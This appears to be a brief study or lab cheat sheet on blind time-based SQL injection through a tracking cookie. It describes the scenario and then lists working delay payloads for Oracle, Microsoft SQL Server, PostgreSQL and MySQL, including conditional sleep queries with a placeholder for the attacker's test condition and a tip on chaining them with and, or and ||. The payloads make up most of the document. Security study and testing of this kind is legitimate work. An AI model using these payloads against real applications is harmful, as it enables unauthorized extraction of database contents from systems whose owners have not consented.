# Scenario
1. The application uses a tracking cookie and performs a **SQL query** containing the value of the submitted cookie.
2. Results of the SQL query are not returned.
3. The application does not respond any differently based on whether the query returns any rows or causes an error.
4. The query is executed synchronously, it is possible to trigger **conditional time delays** to infer information. 

# Payload

**Oracle** 	dbms_pipe.receive_message(('a'),10)
**Microsoft** 	WAITFOR DELAY '0:0:10'
**PostgreSQL** 	SELECT pg_sleep(10)
**MySQL** 	SELECT SLEEP(10) 

**Oracle** 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
**Microsoft** 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
**PostgreSQL** 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
**MySQL** 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 

# Note
1. Use `and`, `or`, `||` (string concatenate, 'he'||'llo' -> 'hello') to trigger time delays
